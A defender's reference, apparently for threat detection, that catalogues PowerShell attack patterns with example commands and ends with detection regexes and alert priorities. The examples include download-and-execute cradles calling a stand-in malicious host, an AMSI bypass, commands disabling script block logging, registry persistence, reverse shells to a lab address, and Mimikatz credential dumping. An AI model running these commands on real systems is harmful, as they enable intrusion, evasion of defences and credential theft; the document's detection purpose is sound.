# PowerShell Attack Patterns — Examples

## Suspicious PowerShell Behaviors

### PowerShell Interacting with Other Processes

**Example:**

```powershell
powershell.exe -Command "Start-Process cmd.exe"
```

**Suspicious behavior:**

* Launching shells or administrative tools
* Injecting into other processes
* Spawning LOLBins (Living-off-the-Land binaries)

---

### PowerShell Execution Without `powershell.exe`

**Example:**

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://example.com/payload.sct")
```

**Example using .NET:**

```csharp
System.Management.Automation.PowerShell.Create()
```

**Suspicious behavior:**

* Embedded PowerShell execution via .NET
* Fileless malware techniques

---

### Suspicious Parent Processes

**Example:**

```text
WINWORD.EXE → powershell.exe
```

**Common malicious scenario:**

* Malicious Office macro spawning PowerShell

**PowerShell example:**

```powershell
powershell.exe -nop -w hidden -enc <base64>
```

---

### Suspicious Child Processes Spawned by PowerShell

**Example:**

```powershell
powershell.exe -Command "cmd.exe /c whoami"
```

**Other suspicious child processes:**

* `cmd.exe`
* `rundll32.exe`
* `regsvr32.exe`
* `mshta.exe`
* `certutil.exe`

---

### Suspicious PowerShell Command-Line Patterns

**Example:**

```powershell
powershell.exe -nop -exec bypass -w hidden -enc SQBFAFgA...
```

**Indicators:**

* `-nop` → No profile
* `-w hidden` → Hidden window
* `-enc` → Base64 encoded payload
* `-exec bypass` → Execution policy bypass

---

### PowerShell Obfuscation Techniques

**Example:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')
```

**Obfuscated variant:**

```powershell
I`E`X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("SQBFAFgA")))
```

---

### Renamed PowerShell Binaries

**Example:**

```text
svchost.exe (actually renamed powershell.exe)
```

**Detection idea:**

* Hash matches PowerShell binary
* Unexpected execution path

---

### Suspicious PowerShell Network Activity

**Example:**

```powershell
Invoke-WebRequest http://malicious.site/payload.ps1 -OutFile payload.ps1
```

**Other examples:**

```powershell
(New-Object Net.WebClient).DownloadFile(...)
```

---

### Suspicious File Creation or Modification

**Example:**

```powershell
Set-Content C:\Users\Public\runme.bat "powershell -enc ..."
```

**Indicators:**

* Files dropped into temp directories
* Scheduled task scripts
* Startup folder persistence

---

### PowerShell Persistence / Autorun Locations

**Example:**

```powershell
New-ItemProperty `
  -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "Updater" `
  -Value "powershell.exe -WindowStyle Hidden ..."
```

---

# Security Evasion & Bypass Techniques

## AMSI Bypass

**Example:**

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\
.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## Disabling Script Block Logging

**Example:**

```powershell
Set-ItemProperty `
  HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging `
  -Name EnableScriptBlockLogging -Value 0
```

---

## Bypassing Constrained Language Mode

**Example:**

```powershell
powershell.exe -Version 2
```

**Reason:**

* PowerShell v2 lacks many modern security controls

---

## Suspicious AMSI / Script Block Content

**Example patterns:**

```powershell
Invoke-Expression
FromBase64String
Reflection.Assembly
VirtualAlloc
WriteProcessMemory
```

---

# Lateral Movement

## Remote PowerShell Execution

**Example:**

```powershell
Invoke-Command -ComputerName SERVER01 -ScriptBlock { whoami }
```

---

## WinRM-Based Movement

**Example:**

```powershell
Enter-PSSession -ComputerName DC01
```

---

## WMI Remote Execution

**Example:**

```powershell
Invoke-WmiMethod -Class Win32_Process `
  -Name Create `
  -ArgumentList "powershell.exe -enc <payload>"
```

---

# Common Offensive Frameworks — Examples

## PowerSploit

**Example module:**

```powershell
Import-Module .\PowerSploit.psd1
Invoke-Mimikatz
```

---

## PowerCat

**Example reverse shell:**

```powershell
powercat -c 10.10.10.5 -p 4444 -e cmd.exe
```

---

## Empire

**Example stager:**

```powershell
powershell -noP -sta -w 1 -enc <EmpirePayload>
```

---

## Nishang

**Example payload:**

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.5 -Port 4444
```

---

## Invoke-Mimikatz

**Example:**

```powershell
Invoke-Mimikatz -DumpCreds
```

---

# Suspicious Functions & Cmdlets — Examples

## Get-GPPPassword

**Purpose:** Retrieve Group Policy Preferences passwords

```powershell
Get-GPPPassword
```

---

## Invoke-Mimikatz

**Purpose:** Credential dumping

```powershell
Invoke-Mimikatz -DumpCreds
```

---

## Invoke-NinjaCopy

**Purpose:** Copy locked files such as NTDS.dit

```powershell
Invoke-NinjaCopy -Path C:\Windows\NTDS\ntds.dit
```

---

## Invoke-Shellcode

**Purpose:** In-memory shellcode execution

```powershell
Invoke-Shellcode -Payload windows/meterpreter/reverse_https
```

---

## PowerView

**Purpose:** Active Directory reconnaissance

```powershell
Get-NetUser
Get-NetComputer
```

---

# Suspicious Parent Process Examples

| Parent Process | Example Attack Scenario             |
| -------------- | ----------------------------------- |
| `winword.exe`  | Malicious macro launches PowerShell |
| `excel.exe`    | Excel VBA downloader                |
| `outlook.exe`  | Email attachment execution          |
| `w3wp.exe`     | Web shell spawning PowerShell       |
| `wmiprvse.exe` | WMI-based remote execution          |
| `mshta.exe`    | HTA malware loader                  |
| `regsvr32.exe` | Squiblydoo attack                   |
| `rundll32.exe` | LOLBin proxy execution              |
| `services.exe` | Service-based persistence           |
| `sqlservr.exe` | SQL Server `xp_cmdshell` abuse      |

---

# Common Detection Patterns

## Encoded Command Detection

**Regex Example:**

```regex
(?i)(-enc|-encodedcommand)\s+[A-Za-z0-9+/=]{20,}
```

---

## Download Cradle Detection

**Example:**

```powershell
IEX(New-Object Net.WebClient).DownloadString(...)
```

---

## Hidden Window Execution

**Example:**

```powershell
powershell.exe -WindowStyle Hidden
```

---

# High-Risk Indicators

Prioritize alerts when multiple indicators occur together:

* Encoded commands
* Hidden execution
* Network downloads
* AMSI bypass
* Office spawning PowerShell
* Credential dumping functions
* Remote execution behavior
* PowerShell v2 usage
* Obfuscation or reflection APIs
